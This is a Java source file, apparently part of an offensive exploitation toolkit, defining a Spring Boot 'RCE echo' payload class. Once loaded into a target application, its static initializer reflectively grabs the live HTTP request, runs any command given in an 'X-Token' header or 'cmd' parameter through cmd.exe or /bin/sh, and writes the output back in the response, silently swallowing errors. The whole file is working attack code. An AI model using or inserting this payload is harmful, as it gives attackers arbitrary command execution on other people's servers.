package com.ppp.middleware.rceecho;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.Middleware;

import java.io.InputStream;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-web
 * [2.2.x, 2.7.x]
 */
@Middleware(Middleware.Spring)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
public class SpringRE {
    public static String HEADER = "X-Token";
    private static String PARAM = "cmd";

    static {
        try {
            Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Object object = clazz.getMethod("getRequestAttributes").invoke(null);

            Object request = invokeMethod(object, "getRequest", new Class[]{}, new Object[]{});
            Object response = invokeMethod(object, "getResponse", new Class[]{}, new Object[]{});
            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            Object parameter = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});

            String str = null;
            if (header != null) {
                str = (String) header;
            } else if (parameter != null) {
                str = (String) parameter;
            }

            String result = exec(str);
            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        } catch (Exception e) {

        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }
}
